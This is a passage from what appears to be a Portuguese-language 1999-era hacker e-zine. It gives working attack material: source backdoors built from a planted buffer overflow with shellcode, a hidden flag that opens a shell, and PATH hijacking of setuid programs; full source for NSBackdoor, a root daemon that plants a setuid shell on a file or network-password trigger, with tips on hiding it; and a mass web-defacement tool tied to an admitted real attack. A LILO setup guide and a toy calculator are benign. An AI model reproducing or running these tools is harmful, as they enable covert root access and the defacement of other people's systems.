colocando um bug exploitavel como por exemplo de buffer overflow.
  Um exemplo manero pode ser:

char a[50];
if(strcmp(argv[1],"-h4ckm3")==0) {
  printf("0x%x\n", (long)a );
  strcpy(a,argv[2]);
}

  Rlz heim??
  Agora compile e reinsta-le o prog em cima do antigo. O exploit esta aqui.


<++> secret/xploit.c

#define PROG "/bin/login"    // Coloque o prog ataquado aki!!!


char shellcode[] =
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";

char buffer[82];

void main() {
  int i;  
  long *long_ptr = (long *) buffer;

  for (i = 0; i < 32; i++)
    *(long_ptr + i) = 0xbffff9ac;  //Mude aki o endereco do buffer vuln

  for (i = 0; i < strlen(shellcode); i++)
    buffer[i] = shellcode[i];

  execl(PROG,PROG,"-h4ckm3",buffer,0);
}

<-->


  Deu pra entender neh???



#########
#  4a.  #
#########

  Igual a anterior mas para os mais preguisosos.

if(strcmp(argv[1],"-h4ckm3")==0)
  execl("/bin/sh", "sh", "-i", 0);

  Sakou??? eh soh executa o prg com "-h4ckm3" e a shell eh aberta.



#########
#  5a.  #
#########

  Esse metodo eh mais criativo do que os outros e tambem pode ser usado em
casos separados para exploitar programas mau escritos.
  Aki voce tambem conhecera este bug que ateh agora nao vi nenhum
documento relatando o problema.
  Vamos aos fatos... Digamos que la no meio do programa vc encontra:

<++> secret/vuln.c
main() {
  system("ls");
}
<-->

  Note que o caminho completo do comando(/bin/ls) nao foi indicado. Entao
o system() vai procura o ls no $PATH e executa-lo.
  Pois eh... Entao caso voce mude o $PATH para digamos somente "/tmp" o
system() nao vai encontrar nenhum ls.
  E se nos criarmos um ls??? Boa ideia.

<++> secret/ls.c
main() {
  execl("/bin/sh", "sh", "-i", 0);
}
<-->

  Ta um pokinhu diferente neh?? =)
  Compile como /tmp/ls e mude o $PATH para /tmp e vejamos o que acontece
qdo executarmos o programa vuln.

$ gcc ls.c -o /tmp/ls
$ PATH="/tmp"
$ ./vuln

  Outra shell sera aberta ao rodar o prog vuln. Caso este tenha +s voce
vai ganhar nada mais do que uma rootshell. Que blza nao???
  Ok... Agora c ja conhece a manha entao vamos ao que voce deve fazer...
  Ta na kra neh?? Poe lah no meio algo como...

system("echo");

  Qdo o prog for rodado normalmente aparecera soh uma linha em branca.
Para exploitar compile o ls.c como /tmp/echo e mude o $PATH.
  Easy naum???



#######
# FiN #
#######

  Essas backdoors nao sao muito comuns porque temos que baixar e mecher no
source dos progs o que eh um pouko mais trabalhoso do que simplesmente
copiar um /bin/sh com setuid. Porem estas backdoors sao muito dificeis de
serem encontradas pelo admin do systema e por outros hackers.
  Thats all guys!!!
  









    ______
___/   __ \______
      ) _\_)_____)    08. NSBackdoor
     / (____)             Cheat Struck
      (_____)
--\___(____)

  Ae gurizada medonha!!!
  Como ja eh de costume estou aki novamente para trazer a vcs mais um
programa elitao da FABRICA DE AMOR CHEAT STRUCK.
  O que este faiz agora?? C voce ja deu uma passada na minha page
(atualizada em dezembro/99), ja deve ter visto o nsbackdoor versao 1.0, que
foi publicada apenas para demonstrar uma ideia minha ao mundo. Mas agora o
negocio pegou fogo e ta bem quente.
  Vamos a alguns exemplos de como usa-lo:


  root# ./nsback -f &
  [1] 3035
  struck$ cd /tmp
  struck$ ls -a
  .       ..
  struck$ touch .teta7374
  (espere 1 minuto)
  struck$ ls -la
  .       ..      .s
  struck$ ./.s
  root# rm -f .s


  Este metodo eh o antigo. Voce ativa a backdoor atravez de um arquivo
vazio e em 60 segundos a back eh criada. Lembre-se de apagar a backdoor
assim q executa-la para nao deixar suspeitas.


  root# ./nsback -fp &
  [2] 3042
  struck$ cd /tmp
  struck$ echo fucklit0 > .teta7374
  (espere 1 minuto)
  struck$ ./.s
  root#


  Aki eh praticamente a mesma coisa, mas dentro do arquivo deve conter a
senha do jogo ou nada feito. Se o programa detectar o arquivo mas nao a
senha, ele sera apagado para que sirva de sinal a vc q a senha ta errada.


  root# ./nsback -c &
  [3] 3046
  struck$ telnet 127.0.0.1 7374
  Trying 127.0.0.1...
  Connected to 127.0.0.1.
  Escape character is '^]'.
  fucklit0                             <---- Digite a senha aki!!!
  Connection closed by foreign host.
  struck$ ./.s
  root#


  Essa eh nova, voce pode ativar a backdoor remotamente atravez de uma
porta q o programa abre. Caso a senha entrada for incorreta, o programa
fecha a porta e soh a reabre dentro de 1 minuto. Isso eh otimo para evitar
que SPKs (Scan Port Kiddies) ou admins achem sua backdoor.
  E eh issu ae gurizao. Agora vc tem uma ferramenta preciosa em suas maos,
e use-a da melhor maneira q encontrar. Uma dica... coloque-a no rc.d e
salve-o com um nome disfarcado como /usr/sbin/tty-init.



<++> nsback/nsb.c
/*  NSBACKDOOR v2.1 by Cheat Struck
 *
 *  Esta eh a versao updateada da SUPER ELEET HACKER BACKDOOR feita por
 * Cheat Struck para voce.  A versao  1.0  era  bem  simples  e  eu nem
 * pensava  em  mecher  mais  neste prog. Mas como acharam hax0r decidi 
 * fazer algo realmente lito para vcs temerem.
 *  Sem mais enrolacao, vamos aos modos de execucao do prog:
 *
 *
 *  [root@phear]# ./nsback [tipo] &
 *  
 *  tipo:
 *  -f  =  Ativa a backdoor BACK_FILE atravez do arquivo TMP_FILE
 *  -fp =  O mesmo porem dentro do TMP_FILE deve ter a PASSWORD
 *  -c  =  Ativa a backdoor remotamente pela PORT e necessita PASSWORD
 *
 *
 *  O modo padrao usado eh -f.
 *  Este programa deve ser executado como root e pode ficar em background
 * para nao atrapalhar outros jobs. Sendo assim o & eh necessario.
 *  
 */

#define BACK_FILE "/tmp/.s"           /* This is the shell backdoor */
#define TMP_FILE  "/tmp/.teta7374"
#define PASSWORD  "cstruck0"
#define PORT      7374

#include <stdio.h>
#include <stdlib.h>
#include <pwd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>


char shell[15];
char pass[sizeof(PASSWORD)];
char com[2048];


void get_sh(char user[20]) {
  struct passwd *p;
  p = getpwnam(user);
  sprintf(shell, "%s", p->pw_shell);
} 


void closefile(FILE *fp) {
    fclose(fp);
    sprintf(com, "rm -f %s", TMP_FILE);
    system(com);
}


int fverify(char *file) {
   FILE *fp;
   if((fp=fopen(file,"r")) != NULL) { 
       if(fgets(pass, sizeof(PASSWORD), fp) == NULL) { 
              closefile(fp);
              return(1);
       }
       else { 
              if(strcmp(PASSWORD,pass) == 0) { closefile(fp); return(2); }
              else { closefile(fp); return(1); }
       } 
   }
   else return(0);
}


int cverify(int port) {
  int s0ck, c0nnect, size;
  struct sockaddr_in ina, client;

  if((s0ck=socket(AF_INET,SOCK_STREAM,0)) == -1) return(0);
  ina.sin_addr.s_addr = INADDR_ANY;
  ina.sin_family      = AF_INET;
  ina.sin_port        = htons(port);
  bzero(&(ina.sin_zero),8);

  if(bind(s0ck, (struct sockaddr *) &ina, sizeof(ina)) == -1) return(0);
  if(listen(s0ck,1) == -1) return(0);

  size = sizeof(client);
  if((c0nnect = accept(s0ck, (struct sockaddr *) &client, &size)) == -1) return(0);
  size = sizeof(PASSWORD) - 1;
  if(recv(c0nnect, pass, size,0) == -1) return(0);
  if(strncmp((char *)PASSWORD, pass, size) == 0) {
         close(c0nnect); close(s0ck);
         return(1);
  }
  else { close(c0nnect); close(s0ck); return(0); }
}


int makeback(void) {
  sprintf(com, "cp %s %s", shell, BACK_FILE);
  system(com);
  sprintf(com, "chmod +s %s", BACK_FILE);
  system(com);
}



main(int argc, char *argv[]) {
  int type=1;

  if(argc > 1) {
   if(strcmp(argv[1],"-f") == 0) type=1;
   if(strcmp(argv[1],"-c") == 0) type=2;
   if(strcmp(argv[1],"-fp") == 0) type=3;
  } 

  get_sh("root");
  while(0 == 0) {
        if((type == 1) && (fverify(TMP_FILE) >= 1)) makeback();
        if((type == 2) && (cverify(PORT) == 1)) makeback(); 
        if((type == 3) && (fverify(TMP_FILE) == 2)) makeback();
        sleep(60);
  }

}

<-->


   Prontu! Tah tudo ae. 
   O source aberto aki eh da versao 2.1 do nsb, que ja esta desatualizada
no meu HD. A atual ja eh 3.7 que c comparada a esta faria ela virar um
lixo. Mas este ja eh total private e vai levar um tempo ainda para ser
aberto ao publico.










    ______
___/   __ \______
      ) _\_)_____)    09. iNiCiANDO VARiOS KERNELS NO LiLO BOOT
     / (____)             Cheat Struck
      (_____)
--\___(____)


   Issu veio cuma ideia do wonder (under) la do #linux. Ateh entao eu nao
havia pensado nissu... Bem... o esquema eh colocarmos o lilo pra iniciar
com o kernel q quizermos sendo para testar bugs ou para o diabos que vc
quizer...
   Vamos a como fazer issu....
   Edite o arquivo /etc/lilo.conf

-----Cut Here-----

boot=/dev/hda
map=/boot/map
install=/boot/boot.b
prompt
timeout=50
image=/vmlinuz
	label=linux
	root=/dev/hda8
	read-only
other=/dev/hda1
	label=dos
	table=/dev/hda

-----Cut Here-----

   Esse eh um exemplo padraum de um lilo.boot ja configurado para iniciar
em linux/dos. No prompt do lilo boot entao seria assim...

lilo: <tab>
linux        dos
lilo: linux
Loading Linux....

   Agora va para o /usr/src/linux e compile um novo kernel ou soh
reconfigure-o (depende do que vc tiver em mente). Agora nao copie o 
./arch/i386/boot/zImage ou bzImage em cima do /vmlinuz e sim para
/vmlinuz2 (ou o nome que vc quizer).
   Volte no /etc/lilo.conf e adicione as seguintes linhas...

-----Cut Here-----

image=/vmlinuz2
	label=kernel2
	root=/dev/hda8
	read-only

-----Cut Here-----

   Note que no image voce poe o file onde copiou o zImage e label coloque
o nome da porra q vc vai digitar no lilo boot para entrar com esse kernel.
No root coloque a mesma particao que havia no primeiro image (no nosso
exemplo eh /dev/hda8).
   Volte para sua shellzinha e digite:

root# lilo
Added linux *
Added kernel2
Added dos
root#

   E voialah!!! Reinicie e veja o resultado...

lilo: <tab>
linux      kernel2      dos
lilo: kernel2
Loading kernel2....

   Prontinhu!!!
   Issu tambem serve para akelas pessoas que vivem esquecendo alguma coisa
ao compilar o kernel como por exemplo copiam o zImage em cima do /vmlinuz
e esquecem de dar lilo entaum o systema tranca na inicializacaum e c
fodem. Issu serve como um backup para qdo o kernel principal falhar vcs
poderem iniciar neste...
   Caso encerradu...










    ______
___/   __ \______
      ) _\_)_____)    10. Make index
     / (____)             Cheat Struck
      (_____)
--\___(____)

   Este programa foi criado depois de um MASS HACK que eu e o encripty
fizemos pela TDK. O que fizemos foi hacka um servidor de pages e entao
mudamos todos os index.html por um novo que achamos mais bunito. =)
   Uma pena eu soh ter criado este programa depois de ter feito o
defacement, pois teriamos ownado muito mais pages do que ownamos fazendo a
mudanca manualmente.
   O programa eh bem simples e usa diversos system()'s para fazer o
trabalho.
   O que voce precisa fazer eh o seguinte:

1. Envie para o host ownado este programa e a page que substituira as d+;
2. Renomeie a page para index.tdk;
3. Compile o programa, deixando o prg no mesmo dir do index.tdk;
4. Encontre o diretorio onde ficam as pages dos users (ex. /home);
5. Rode o programa na seguinte sintaxe: ./mkindex <dir_das pgs>.

  Agora na tela sera exibido todos os files que o programa esta copiando.

<++> mkindex/mkindex.c
/*  Make Index by Cheat Struck
 *
 *  Este eh mais um prog lito das companias Struck(C) para voce.
 *  O que essa porra faiz eh copiar um arquivo index.html para diversos 
 * destinos. 
 *  Eh muito facil de se usar. Basta especificar um diretorio e o prog
 * procura por todos os index.html neste dir e em seus subdirs (isto pode
 * deixar o programa um pouco retardado caso entre com o dir raiz por
 * exemplo) e entao substitui-os pelo arquivo index.tdk (default).
 *
 *  Como Usar:
 *   bash# mkindex /www
 *    Make Index by Cheat Struck
 *    cp -f index.tdk /www/one/index.html
 *    cp -f index.tdk /www/two/index.html
 *    cp -f index.tdk /www/3/index.html
 *   bash#
 *
 */


#define INDEX_F "index.tdk" 
 //  Ponha aki o arquivo q substituira os demais
#define PROCURA "index.html"
 //  O programa vai procurar por este arquivo no diretorio especificado 


#include <stdio.h>
#include <stdlib.h>
main(int argc, char *argv[]) {

 FILE *fp;
 char com[250], f[150];

 printf(" Make Index by Cheat Struck\n");
 if(argc<2) {
  printf("use    : %s <dir>\n",argv[0]);
  printf("exemplo: %s /www\n",argv[0]);
  exit(1);
 }
 else {
  sprintf(com,"find %s -name %s >> list",argv[1], PROCURA);
  system(com);
  fp = fopen("list","r");
  while( !feof(fp) ) {
   if( fgets(f,150, fp) == NULL) break;
   f[strlen(f) - 1] = ' ';
   sprintf(com, "cp -f %s %s",INDEX_F,f);
   printf("%s\n",com);
   system(com);
  }
  system("rm -f list");
 }
}

<-->










    ______
___/   __ \______
      ) _\_)_____)    11. Calculadora de Vezes
     / (____)             Cheat Struck
      (_____)
--\___(____)

   Aki vai um dos programas mais litoes que ja fiz ateh hoje.
   Ta muito mais hax0r q o teu thasmx!!!! Hehehehehehehe!!!

<++> calc/calc.c
//  Calculadora de vezes by Cheat Struck
#define VERSION 0.000001

int start() {
 printf("Calculadora de vezes v%f\n",VERSION); 
 printf("by Cheat Struck\n");
}

int getnum(int n1) {
 char s1[10];

 printf("numbah%d: ",n1); 
 scanf("%s", s1); 
 n1 = atoi(s1);
 return(n1);
}

int calcula(int n1, int n2) {
 printf("%d x %d = %d\n",n2,n1,n1*n2);
}

main() {

 start();
 calcula(getnum(2),getnum(1));

}

<-->










    ______      
___/   __ \______ 
      ) _\_)_____)    12. The End
     / (____)             Cheat Struck
      (_____)
--\___(____)


   E aki acaba a 1a edicao da Fatal 3rror.
   Se voce gostou, nao gostou, odiou a zine ou simplesmente quer falar
bobagem com um retardado mental como eu, manda um emaiu.
   Eu quero saber c tem gente lendu issu. Ja sei que vai demorar para que
a zine mantenha um publico fiel e grandi mas vou continuar fazendo ateh eu
encher o sako dinovo.
   Entao vamos mandar emaius galera.

   cheat@struck.8m.com

   Como voces podem ter visto, nesta primeira edicao somente eu escrevi
coisas. Isso porque eu so muito desleichado e nao me lembro de falar pras
pessoas que tao querendo me ajudar que comecem a escrever as materias.
   Mas deixa. Acho que para a 1a edicao a zine ficou de bom tamanho e bom
conteudo. Levando em consideracao que foi um trabalho de 1 homem soh.
   Pow!!! Vamos comecar a se mecher entao gente e facam umas coisas boa-
zinhas para eu colocar aki. To escrevendo aki pq eu nao tenhu sako pra
falar issu para cada lokinhu que ta querendo ajudar.
   Bem... achu que nao tem mais o que fikar falando pois ae vou ta apenas
enrolando pra aumentar o volume da zine.
   Entao eh issu.
   Sejam felizes!!! E ateh a proxima edicao da Fatal 3rror!!!










___EoF___
